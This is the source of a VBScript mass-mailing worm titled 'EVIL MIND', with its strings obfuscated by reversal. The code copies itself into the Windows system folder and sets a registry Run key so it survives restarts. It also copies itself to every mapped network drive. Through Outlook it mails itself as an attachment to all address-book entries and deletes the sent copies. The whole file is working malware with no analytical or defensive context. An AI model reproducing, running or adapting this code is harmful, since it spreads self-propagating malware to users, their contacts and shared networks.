' EVIL MIND

On Error Resume Next

Dim TZWPKX
Dim C3PF
Dim V6AYQ9HF
Dim Z2O
Dim Y044D1
Dim JF8Q5
Dim NYF0XR2
Dim DTK
Dim YTIM0
Dim SJW

Set TZWPKX = CreateObject( X4SHWH( "tcejbOmetsySeliF.gnitpircS" ) )
TZWPKX.CopyFile WScript.ScriptFullName, TZWPKX.BuildPath( TZWPKX.GetSpecialFolder(1), X4SHWH( "SBV.WHPNRA" ) )

Set C3PF = CreateObject( X4SHWH( "llehS.tpircSW" ) )
C3PF.RegWrite X4SHWH( "\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" ) & X4SHWH( "WHPNRA" ), TZWPKX.BuildPath( TZWPKX.GetSpecialFolder(1), X4SHWH( "SBV.WHPNRA" ) )


Set V6AYQ9HF = CreateObject( X4SHWH( "krowteN.tpircSW" ) )
Set Y044D1 = V6AYQ9HF.EnumNetworkDrives

If Y044D1.Count <> 0 Then
   For Z2O = 0 To Y044D1.Count - 1
       If InStr( Y044D1.Item( Z2O), X4SHWH( "\" ) ) <> 0 Then
          TZWPKX.CopyFile WScript.ScriptFullName, TZWPKX.BuildPath( Y044D1.Item( Z2O), X4SHWH( "SBV.WHPNRA" ) ) 
       End If
   Next
End If

Z2O = C3PF.RegRead( X4SHWH( "\ENIHCAM_LACOL_YEKH" ) & X4SHWH( "WHPNRA" ) )

If Z2O = "" Or Z2O > 20 Then
   Z2O = 0
End If

If Z2O = 0 Then
   Set DTK = CreateObject( X4SHWH( "noitacilppA.kooltuO" ) )
   Set JF8Q5 = DTK.GetNameSpace( X4SHWH( "IPAM" ) )

   For Each NYF0XR2 In JF8Q5.AddressLists
       Set Y044D1 = DTK.CreateItem( 0 )

       For YTIM0 = 1 To NYF0XR2.AddressEntries.Count
           Set SJW = NYF0XR2.AddressEntries( YTIM0 )

           If YTIM0 = 1 Then
              Y044D1.BCC = SJW.Address
           Else
              Y044D1.BCC = Y044D1.BCC & X4SHWH( " ;" ) & SJW.Address
           End If
       Next

       Y044D1.Subject = X4SHWH( "SUINEG LIVE" )
       Y044D1.Body = X4SHWH( "METSYS RU DNA U DNUORA MA I LIVED MA I" )
       Y044D1.Attachmets.Add WScript.ScriptFullName
       Y044D1.DeleteAfterSubmit = True
       Y044D1.Send
   Next

   Z2O = 0
End If

C3PF.RegWrite X4SHWH( "\ENIHCAM_LACOL_YEKH" ) & X4SHWH( "WHPNRA" ), Z2O + 1

Function X4SHWH( PM9853I )
   Dim LL1INU
   Dim Z0L6M
   Dim UZCFD5

   LL1INU = ""

   For Z0L6M = 1 To Len( PM9853I )
       UZCFD5 = Mid( PM9853I, Z0L6M, 1 )

       LL1INU = UZCFD5 & LL1INU
   Next

   X4SHWH = LL1INU
End Function
